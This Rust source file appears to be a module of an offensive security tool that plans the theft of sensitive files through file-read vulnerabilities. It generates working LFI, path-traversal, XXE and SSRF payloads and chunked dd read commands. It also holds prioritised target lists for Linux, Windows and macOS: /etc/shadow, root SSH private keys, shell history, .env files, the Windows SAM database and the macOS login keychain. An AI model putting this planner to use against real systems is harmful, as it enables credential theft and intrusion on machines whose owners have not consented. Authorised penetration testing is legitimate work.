/// File exfiltration planner for LFI and arbitrary file read vulnerabilities.
///
/// Given a file read primitive (LFI, path traversal, XXE, SSRF file://, or direct
/// arbitrary read), plans systematic exfiltration of high-value files from the
/// target OS. Produces chunked read plans, encoding strategies, and parallel
/// groupings ordered by sensitivity.
use std::fmt;

/// Target operating system for file priority lists.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TargetOs {
    Linux,
    Windows,
    MacOs,
}

impl fmt::Display for TargetOs {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            TargetOs::Linux => write!(f, "linux"),
            TargetOs::Windows => write!(f, "windows"),
            TargetOs::MacOs => write!(f, "macos"),
        }
    }
}

/// Priority level for file targets. Ordered so `Critical` sorts before `Low`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum FilePriority {
    Critical,
    High,
    Medium,
    Low,
}

impl fmt::Display for FilePriority {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            FilePriority::Critical => write!(f, "critical"),
            FilePriority::High => write!(f, "high"),
            FilePriority::Medium => write!(f, "medium"),
            FilePriority::Low => write!(f, "low"),
        }
    }
}

/// Category of sensitive file.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum FileCategory {
    Credentials,
    SshKeys,
    Configuration,
    Database,
    SourceCode,
    Logs,
    SystemInfo,
    CloudMetadata,
    Backup,
    EnvironmentVariables,
}

impl fmt::Display for FileCategory {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            FileCategory::Credentials => write!(f, "credentials"),
            FileCategory::SshKeys => write!(f, "ssh-keys"),
            FileCategory::Configuration => write!(f, "configuration"),
            FileCategory::Database => write!(f, "database"),
            FileCategory::SourceCode => write!(f, "source-code"),
            FileCategory::Logs => write!(f, "logs"),
            FileCategory::SystemInfo => write!(f, "system-info"),
            FileCategory::CloudMetadata => write!(f, "cloud-metadata"),
            FileCategory::Backup => write!(f, "backup"),
            FileCategory::EnvironmentVariables => write!(f, "environment-variables"),
        }
    }
}

/// A file target for exfiltration.
#[derive(Debug, Clone)]
pub struct FileTarget {
    pub path: String,
    pub priority: FilePriority,
    pub category: FileCategory,
    pub description: String,
    pub os: TargetOs,
    pub estimated_size_bytes: Option<usize>,
    pub is_binary: bool,
}

/// How to handle file encoding for exfiltration.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum FileEncoding {
    PlainText,
    Base64,
    HexDump,
    UrlEncoded,
}

impl fmt::Display for FileEncoding {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            FileEncoding::PlainText => write!(f, "plain-text"),
            FileEncoding::Base64 => write!(f, "base64"),
            FileEncoding::HexDump => write!(f, "hex-dump"),
            FileEncoding::UrlEncoded => write!(f, "url-encoded"),
        }
    }
}

/// A chunk of a large file for staged exfiltration.
#[derive(Debug, Clone)]
pub struct FileChunk {
    pub file_path: String,
    pub chunk_index: u32,
    pub total_chunks: u32,
    pub offset: usize,
    pub length: usize,
    pub read_command: String,
}

/// Complete exfiltration plan for one file.
#[derive(Debug, Clone)]
pub struct FilePlan {
    pub target: FileTarget,
    pub encoding: FileEncoding,
    pub chunks: Vec<FileChunk>,
    pub read_payload: String,
    pub total_read_requests: usize,
}

/// Master plan for exfiltrating all priority files.
#[derive(Debug, Clone)]
pub struct FileExfilPlan {
    pub target_os: TargetOs,
    pub file_plans: Vec<FilePlan>,
    pub total_files: usize,
    pub total_requests: usize,
    pub priority_summary: Vec<(FilePriority, usize)>,
    pub parallel_groups: Vec<Vec<usize>>,
}

/// Type of file read vulnerability.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum FileReadVuln {
    Lfi,
    PathTraversal,
    Xxe,
    Ssrf,
    ArbitraryRead,
}

impl fmt::Display for FileReadVuln {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            FileReadVuln::Lfi => write!(f, "lfi"),
            FileReadVuln::PathTraversal => write!(f, "path-traversal"),
            FileReadVuln::Xxe => write!(f, "xxe"),
            FileReadVuln::Ssrf => write!(f, "ssrf"),
            FileReadVuln::ArbitraryRead => write!(f, "arbitrary-read"),
        }
    }
}

/// Configuration for the file exfiltration planner.
#[derive(Debug, Clone)]
pub struct FileExfilConfig {
    pub target_os: TargetOs,
    pub vuln_type: FileReadVuln,
    pub max_read_size: usize,
    pub base_path: Option<String>,
    pub custom_targets: Vec<String>,
    pub encoding: FileEncoding,
    pub parallel_reads: bool,
}

impl FileExfilConfig {
    /// Builder: override the maximum read size per request.
    pub fn with_max_read_size(mut self, size: usize) -> Self {
        self.max_read_size = size;
        self
    }

    /// Builder: set a path traversal prefix.
    pub fn with_base_path(mut self, path: &str) -> Self {
        self.base_path = Some(path.to_string());
        self
    }

    /// Builder: add a custom file target path.
    pub fn with_custom_target(mut self, path: &str) -> Self {
        self.custom_targets.push(path.to_string());
        self
    }

    /// Builder: set encoding strategy.
    pub fn with_encoding(mut self, encoding: FileEncoding) -> Self {
        self.encoding = encoding;
        self
    }

    /// Builder: enable or disable parallel reads.
    pub fn with_parallel_reads(mut self, enabled: bool) -> Self {
        self.parallel_reads = enabled;
        self
    }

    /// Construct a default config for the given OS and vulnerability type.
    pub fn new(target_os: TargetOs, vuln_type: FileReadVuln) -> Self {
        Self {
            target_os,
            vuln_type,
            max_read_size: 8192,
            base_path: None,
            custom_targets: Vec::new(),
            encoding: FileEncoding::PlainText,
            parallel_reads: true,
        }
    }
}

/// Error type for file exfiltration planning.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum FileExfilError {
    InvalidConfig(String),
    UnsupportedOs(String),
    NoTargetFiles,
}

impl fmt::Display for FileExfilError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            FileExfilError::InvalidConfig(msg) => {
                write!(f, "invalid exfil config: {msg}")
            }
            FileExfilError::UnsupportedOs(os) => {
                write!(f, "unsupported target OS: {os}")
            }
            FileExfilError::NoTargetFiles => {
                write!(f, "no target files to exfiltrate")
            }
        }
    }
}

impl std::error::Error for FileExfilError {}

/// Returns the prioritized list of high-value files for a given OS.
///
/// Files are ordered by priority (Critical first) and tagged with category,
/// estimated size, and binary/text classification.
pub fn get_priority_files(os: TargetOs) -> Vec<FileTarget> {
    match os {
        TargetOs::Linux => linux_priority_files(),
        TargetOs::Windows => windows_priority_files(),
        TargetOs::MacOs => macos_priority_files(),
    }
}

/// Plans systematic exfiltration of all priority files for the configured OS.
///
/// Validates config, merges priority files with custom targets, plans per-file
/// reads with chunking, and groups plans into parallel batches by priority.
pub fn plan_file_exfiltration(config: &FileExfilConfig) -> Result<FileExfilPlan, FileExfilError> {
    if config.max_read_size == 0 {
        return Err(FileExfilError::InvalidConfig(
            "max_read_size must be greater than zero".to_string(),
        ));
    }

    let mut targets = get_priority_files(config.target_os);
    for custom in &config.custom_targets {
        targets.push(FileTarget {
            path: custom.clone(),
            priority: FilePriority::High,
            category: FileCategory::Configuration,
            description: format!("custom target: {custom}"),
            os: config.target_os,
            estimated_size_bytes: None,
            is_binary: false,
        });
    }

    if targets.is_empty() {
        return Err(FileExfilError::NoTargetFiles);
    }

    let file_plans: Vec<FilePlan> = targets
        .iter()
        .map(|t| plan_single_file(t, config))
        .collect();

    let total_requests = file_plans.iter().map(|p| p.total_read_requests).sum();
    let parallel_groups = group_parallel_reads(&file_plans);
    let priority_summary = build_priority_summary(&file_plans);
    let total_files = file_plans.len();

    Ok(FileExfilPlan {
        target_os: config.target_os,
        file_plans,
        total_files,
        total_requests,
        priority_summary,
        parallel_groups,
    })
}

/// Plans extraction of a single file target.
///
/// Generates the read payload for the vulnerability type, chunks the file if
/// estimated size exceeds `max_read_size`, and selects encoding (binary files
/// force Base64 unless already set to HexDump).
pub fn plan_single_file(target: &FileTarget, config: &FileExfilConfig) -> FilePlan {
    let encoding = if target.is_binary && config.encoding == FileEncoding::PlainText {
        FileEncoding::Base64
    } else {
        config.encoding
    };

    let read_payload =
        generate_read_payload(&target.path, config.vuln_type, config.base_path.as_deref());

    let estimated = target.estimated_size_bytes.unwrap_or(0);
    let chunks = chunk_file_read(
        &target.path,
        estimated,
        config.max_read_size,
        config.vuln_type,
    );

    let total_read_requests = if chunks.is_empty() { 1 } else { chunks.len() };

    FilePlan {
        target: target.clone(),
        encoding,
        chunks,
        read_payload,
        total_read_requests,
    }
}

/// Generates the injection payload to read a file via the given vulnerability.
///
/// - **LFI**: `php://filter/convert.base64-encode/resource={path}` (with optional
///   base_path prefix for traversal).
/// - **PathTraversal**: URL-encoded `..%2f` sequences prepended to the path.
/// - **XXE**: XML external entity declaration referencing `file://{path}`.
/// - **SSRF**: `file://{path}` URI.
/// - **ArbitraryRead**: the raw path.
pub fn generate_read_payload(
    path: &str,
    vuln_type: FileReadVuln,
    base_path: Option<&str>,
) -> String {
    match vuln_type {
        FileReadVuln::Lfi => {
            let prefix = base_path.unwrap_or("../../../");
            format!("php://filter/convert.base64-encode/resource={prefix}{path}")
        }
        FileReadVuln::PathTraversal => {
            let prefix = base_path.unwrap_or("..%2f..%2f..%2f");
            format!("{prefix}{path}")
        }
        FileReadVuln::Xxe => {
            format!(
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file://{path}\">]>\
                 <root>&xxe;</root>"
            )
        }
        FileReadVuln::Ssrf => {
            format!("file://{path}")
        }
        FileReadVuln::ArbitraryRead => path.to_string(),
    }
}

/// Generates chunked read commands for staged exfiltration of large files.
///
/// When `estimated_size` is zero or fits within a single `max_chunk_size`,
/// returns a single whole-file chunk. Otherwise splits into sequential
/// offset/length pairs with `dd`-based read commands.
pub fn chunk_file_read(
    path: &str,
    estimated_size: usize,
    max_chunk_size: usize,
    vuln_type: FileReadVuln,
) -> Vec<FileChunk> {
    let clamped_chunk = if max_chunk_size == 0 {
        8192
    } else {
        max_chunk_size
    };

    if estimated_size == 0 || estimated_size <= clamped_chunk {
        return vec![FileChunk {
            file_path: path.to_string(),
            chunk_index: 0,
            total_chunks: 1,
            offset: 0,
            length: estimated_size,
            read_command: generate_read_payload(path, vuln_type, None),
        }];
    }

    let total_chunks = estimated_size.div_ceil(clamped_chunk);
    (0..total_chunks)
        .map(|i| {
            let offset = i * clamped_chunk;
            let length = clamped_chunk.min(estimated_size - offset);
            let skip = offset / clamped_chunk;
            let read_command =
                format!("dd if={path} bs={clamped_chunk} skip={skip} count=1 2>/dev/null");
            FileChunk {
                file_path: path.to_string(),
                chunk_index: i as u32,
                total_chunks: total_chunks as u32,
                offset,
                length,
                read_command,
            }
        })
        .collect()
}

/// Groups file plans into parallel read batches by priority level.
///
/// All plans sharing a priority are placed in the same batch. Batches are
/// ordered Critical → High → Medium → Low so the most sensitive files
/// are read first.
pub fn group_parallel_reads(plans: &[FilePlan]) -> Vec<Vec<usize>> {
    let priorities = [
        FilePriority::Critical,
        FilePriority::High,
        FilePriority::Medium,
        FilePriority::Low,
    ];

    priorities
        .iter()
        .filter_map(|prio| {
            let group: Vec<usize> = plans
                .iter()
                .enumerate()
                .filter(|(_, p)| p.target.priority == *prio)
                .map(|(i, _)| i)
                .collect();
            if group.is_empty() {
                None
            } else {
                Some(group)
            }
        })
        .collect()
}

fn build_priority_summary(plans: &[FilePlan]) -> Vec<(FilePriority, usize)> {
    let priorities = [
        FilePriority::Critical,
        FilePriority::High,
        FilePriority::Medium,
        FilePriority::Low,
    ];
    priorities
        .iter()
        .filter_map(|prio| {
            let count = plans.iter().filter(|p| p.target.priority == *prio).count();
            if count > 0 {
                Some((*prio, count))
            } else {
                None
            }
        })
        .collect()
}

fn ft(
    path: &str,
    priority: FilePriority,
    category: FileCategory,
    description: &str,
    os: TargetOs,
    estimated_size_bytes: Option<usize>,
    is_binary: bool,
) -> FileTarget {
    FileTarget {
        path: path.to_string(),
        priority,
        category,
        description: description.to_string(),
        os,
        estimated_size_bytes,
        is_binary,
    }
}

fn linux_priority_files() -> Vec<FileTarget> {
    let os = TargetOs::Linux;
    let mut files = Vec::new();

    files.extend(linux_critical_files(os));
    files.extend(linux_high_files(os));
    files.extend(linux_medium_files(os));
    files.extend(linux_low_files(os));

    files
}

fn linux_critical_files(os: TargetOs) -> Vec<FileTarget> {
    vec![
        ft(
            "/etc/shadow",
            FilePriority::Critical,
            FileCategory::Credentials,
            "shadow password hashes",
            os,
            Some(1_500),
            false,
        ),
        ft(
            "/etc/passwd",
            FilePriority::Critical,
            FileCategory::Credentials,
            "user account database",
            os,
            Some(2_500),
            false,
        ),
        ft(
            "/root/.ssh/id_rsa",
            FilePriority::Critical,
            FileCategory::SshKeys,
            "root RSA private key",
            os,
            Some(3_300),
            false,
        ),
        ft(
            "/root/.ssh/id_ed25519",
            FilePriority::Critical,
            FileCategory::SshKeys,
            "root Ed25519 private key",
            os,
            Some(500),
            false,
        ),
        ft(
            "/root/.bash_history",
            FilePriority::Critical,
            FileCategory::Credentials,
            "root command history (may contain passwords)",
            os,
            Some(10_000),
            false,
        ),
    ]
}

fn linux_high_files(os: TargetOs) -> Vec<FileTarget> {
    vec![
        ft(
            "/etc/hosts",
            FilePriority::High,
            FileCategory::Configuration,
            "host-to-IP mappings",
            os,
            Some(400),
            false,
        ),
        ft(
            "/proc/self/environ",
            FilePriority::High,
            FileCategory::EnvironmentVariables,
            "process environment variables",
            os,
            Some(4_096),
            true,
        ),
        ft(
            "/var/www/.env",
            FilePriority::High,
            FileCategory::EnvironmentVariables,
            "web application environment file",
            os,
            Some(1_000),
            false,
        ),
        ft(
            "/opt/app/.env",
            FilePriority::High,
            FileCategory::EnvironmentVariables,
            "application environment file",
            os,
            Some(1_000),
            false,
        ),
        ft(
            "/etc/nginx/nginx.conf",
            FilePriority::High,
            FileCategory::Configuration,
            "nginx web server configuration",
            os,
            Some(3_000),
            false,
        ),
        ft(
            "/etc/apache2/apache2.conf",
            FilePriority::High,
            FileCategory::Configuration,
            "Apache web server configuration",
            os,
            Some(7_000),
            false,
        ),
        ft(
            "/etc/mysql/my.cnf",
            FilePriority::High,
            FileCategory::Database,
            "MySQL database configuration",
            os,
            Some(3_500),
            false,
        ),
        ft(
            "/etc/postgresql/15/main/pg_hba.conf",
            FilePriority::High,
            FileCategory::Database,
            "PostgreSQL host-based auth config",
            os,
            Some(5_000),
            false,
        ),
    ]
}

fn linux_medium_files(os: TargetOs) -> Vec<FileTarget> {
    vec![
        ft(
            "/etc/crontab",
            FilePriority::Medium,
            FileCategory::Configuration,
            "system cron jobs",
            os,
            Some(1_200),
            false,
        ),
        ft(
            "/var/log/auth.log",
            FilePriority::Medium,
            FileCategory::Logs,
            "authentication log",
            os,
            Some(50_000),
            false,
        ),
        ft(
            "/etc/resolv.conf",
            FilePriority::Medium,
            FileCategory::Configuration,
            "DNS resolver config",
            os,
            Some(200),
            false,
        ),
        ft(
            "/proc/self/cmdline",
            FilePriority::Medium,
            FileCategory::SystemInfo,
            "current process command line",
            os,
            Some(256),
            true,
        ),
        ft(
            "/proc/version",
            FilePriority::Medium,
            FileCategory::SystemInfo,
            "kernel version string",
            os,
            Some(200),
            false,
        ),
        ft(
            "/etc/os-release",
            FilePriority::Medium,
            FileCategory::SystemInfo,
            "OS identification data",
            os,
            Some(400),
            false,
        ),
    ]
}

fn linux_low_files(os: TargetOs) -> Vec<FileTarget> {
    vec![
        ft(
            "/etc/hostname",
            FilePriority::Low,
            FileCategory::SystemInfo,
            "system hostname",
            os,
            Some(64),
            false,
        ),
        ft(
            "/etc/issue",
            FilePriority::Low,
            FileCategory::SystemInfo,
            "pre-login banner",
            os,
            Some(128),
            false,
        ),
        ft(
            "/etc/motd",
            FilePriority::Low,
            FileCategory::SystemInfo,
            "message of the day",
            os,
            Some(512),
            false,
        ),
    ]
}

fn windows_priority_files() -> Vec<FileTarget> {
    let os = TargetOs::Windows;
    let mut files = Vec::new();

    files.extend(windows_critical_files(os));
    files.extend(windows_high_files(os));
    files.extend(windows_medium_files(os));
    files.extend(windows_low_files(os));

    files
}

fn windows_critical_files(os: TargetOs) -> Vec<FileTarget> {
    vec![
        ft(
            r"C:\Windows\System32\config\SAM",
            FilePriority::Critical,
            FileCategory::Credentials,
            "Security Account Manager database",
            os,
            Some(262_144),
            true,
        ),
        ft(
            r"C:\Windows\repair\SAM",
            FilePriority::Critical,
            FileCategory::Backup,
            "SAM backup from repair folder",
            os,
            Some(262_144),
            true,
        ),
        ft(
            "web.config",
            FilePriority::Critical,
            FileCategory::Configuration,
            "ASP.NET web application config (connection strings)",
            os,
            Some(4_000),
            false,
        ),
        ft(
            r"C:\inetpub\wwwroot\web.config",
            FilePriority::Critical,
            FileCategory::Configuration,
            "IIS default site web.config",
            os,
            Some(4_000),
            false,
        ),
    ]
}

fn windows_high_files(os: TargetOs) -> Vec<FileTarget> {
    vec![
        ft(
            r"C:\Windows\System32\drivers\etc\hosts",
            FilePriority::High,
            FileCategory::Configuration,
            "host-to-IP mappings",
            os,
            Some(1_024),
            false,
        ),
        ft(
            r"C:\Users\Administrator\.ssh\id_rsa",
            FilePriority::High,
            FileCategory::SshKeys,
            "administrator RSA private key",
            os,
            Some(3_300),
            false,
        ),
        ft(
            r"C:\Windows\win.ini",
            FilePriority::High,
            FileCategory::Configuration,
            "Windows initialization file",
            os,
            Some(500),
            false,
        ),
        ft(
            r"C:\Windows\php.ini",
            FilePriority::High,
            FileCategory::Configuration,
            "PHP configuration (may contain DB credentials)",
            os,
            Some(70_000),
            false,
        ),
        ft(
            r"C:\xampp\apache\conf\httpd.conf",
            FilePriority::High,
            FileCategory::Configuration,
            "XAMPP Apache configuration",
            os,
            Some(20_000),
            false,
        ),
    ]
}

fn windows_medium_files(os: TargetOs) -> Vec<FileTarget> {
    vec![
        ft(
            r"C:\Windows\System32\config\RegBack\SAM",
            FilePriority::Medium,
            FileCategory::Backup,
            "SAM registry backup",
            os,
            Some(262_144),
            true,
        ),
        ft(
            r"C:\Windows\debug\NetSetup.LOG",
            FilePriority::Medium,
            FileCategory::Logs,
            "network setup log (domain join info)",
            os,
            Some(8_000),
            false,
        ),
        ft(
            r"C:\Windows\System32\config\AppEvent.Evt",
            FilePriority::Medium,
            FileCategory::Logs,
            "application event log",
            os,
            Some(524_288),
            true,
        ),
    ]
}

fn windows_low_files(os: TargetOs) -> Vec<FileTarget> {
    vec![ft(
        r"C:\Windows\System32\license.rtf",
        FilePriority::Low,
        FileCategory::SystemInfo,
        "Windows license (confirms OS version)",
        os,
        Some(30_000),
        false,
    )]
}

fn macos_priority_files() -> Vec<FileTarget> {
    let os = TargetOs::MacOs;
    let mut files = Vec::new();

    files.extend(macos_critical_files(os));
    files.extend(macos_high_files(os));
    files.extend(macos_medium_files(os));
    files.extend(macos_low_files(os));

    files
}

fn macos_critical_files(os: TargetOs) -> Vec<FileTarget> {
    vec![
        ft(
            "/etc/master.passwd",
            FilePriority::Critical,
            FileCategory::Credentials,
            "BSD master password file with hashes",
            os,
            Some(3_000),
            false,
        ),
        ft(
            "/etc/shadow",
            FilePriority::Critical,
            FileCategory::Credentials,
            "shadow password hashes (if present)",
            os,
            Some(1_500),
            false,
        ),
        ft(
            "/root/.ssh/id_rsa",
            FilePriority::Critical,
            FileCategory::SshKeys,
            "root RSA private key",
            os,
            Some(3_300),
            false,
        ),
        ft(
            "/root/.ssh/id_ed25519",
            FilePriority::Critical,
            FileCategory::SshKeys,
            "root Ed25519 private key",
            os,
            Some(500),
            false,
        ),
        ft(
            "/private/etc/kcpassword",
            FilePriority::Critical,
            FileCategory::Credentials,
            "auto-login password (XOR obfuscated)",
            os,
            Some(640),
            true,
        ),
        ft(
            "/Users/*/Library/Keychains/login.keychain-db",
            FilePriority::Critical,
            FileCategory::Credentials,
            "macOS login keychain database",
            os,
            Some(200_000),
            true,
        ),
    ]
}

fn macos_high_files(os: TargetOs) -> Vec<FileTarget> {
    vec![
        ft(
            "/etc/hosts",
            FilePriority::High,
            FileCategory::Configuration,
            "host-to-IP mappings",
            os,
            Some(400),
            false,
        ),
        ft(
            "/etc/apache2/httpd.conf",
            FilePriority::High,
            FileCategory::Configuration,
            "Apache web server configuration",
            os,
            Some(21_000),
            false,
        ),
        ft(
            "/usr/local/etc/nginx/nginx.conf",
            FilePriority::High,
            FileCategory::Configuration,
            "Homebrew nginx configuration",
            os,
            Some(3_000),
            false,
        ),
        ft(
            "/var/www/.env",
            FilePriority::High,
            FileCategory::EnvironmentVariables,
            "web application environment file",
            os,
            Some(1_000),
            false,
        ),
    ]
}

fn macos_medium_files(os: TargetOs) -> Vec<FileTarget> {
    vec![
        ft(
            "/etc/crontab",
            FilePriority::Medium,
            FileCategory::Configuration,
            "system cron jobs",
            os,
            Some(1_200),
            false,
        ),
        ft(
            "/var/log/system.log",
            FilePriority::Medium,
            FileCategory::Logs,
            "system log",
            os,
            Some(100_000),
            false,
        ),
        ft(
            "/etc/resolv.conf",
            FilePriority::Medium,
            FileCategory::Configuration,
            "DNS resolver config",
            os,
            Some(200),
            false,
        ),
        ft(
            "/etc/os-release",
            FilePriority::Medium,
            FileCategory::SystemInfo,
            "OS identification data",
            os,
            Some(400),
            false,
        ),
    ]
}

fn macos_low_files(os: TargetOs) -> Vec<FileTarget> {
    vec![
        ft(
            "/etc/hostconfig",
            FilePriority::Low,
            FileCategory::SystemInfo,
            "legacy host configuration",
            os,
            Some(256),
            false,
        ),
        ft(
            "/etc/motd",
            FilePriority::Low,
            FileCategory::SystemInfo,
            "message of the day",
            os,
            Some(512),
            false,
        ),
    ]
}
